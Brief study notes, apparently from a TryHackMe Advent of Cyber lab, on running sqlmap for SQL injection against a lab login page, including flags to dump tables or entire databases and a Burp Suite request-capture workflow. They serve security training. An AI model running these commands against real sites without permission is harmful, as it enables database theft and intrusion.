--- ---

<h2>Top Commands</h2>

SQLmap (URL)
```Terminal
sqlmap --url http://tbfc.net/login.php --tables --columns
```

- --tables    ---> Check tables
- --columns ---> Check columns

- --url = Provide URL for the attack
- --dbms = Tell SQLMap the type of database that is running
- --dump = Dump the data within the database that the application uses
- --dump-all = Dump the ENTIRE database
- --batch = SQLMap will run automatically and won't ask for user input

SQLmap(BurpSuite ---> Very Good)
```Terminal
sqlmap -r filename
```

- Use Burpsuite to intercept a request (ex: https://website.com/inurl?id=ELEMENT)
- Save the item
- Use the comment to launch SQLmap

- Screenshot
    ![](https://assets.tryhackme.com/additional/cmn-aoc2020/day-5/foxyproxy.png)
	![](https://assets.tryhackme.com/additional/cmn-aoc2020/day-5/bpsuite_2.png)
    ![](https://assets.tryhackme.com/additional/cmn-aoc2020/day-5/bpsuite_3.png)

---

All Information ---> https://github.com/sqlmapproject/sqlmap

<iframe src="https://github.com/sqlmapproject/sqlmap" width="100%" height="1300"></iframe>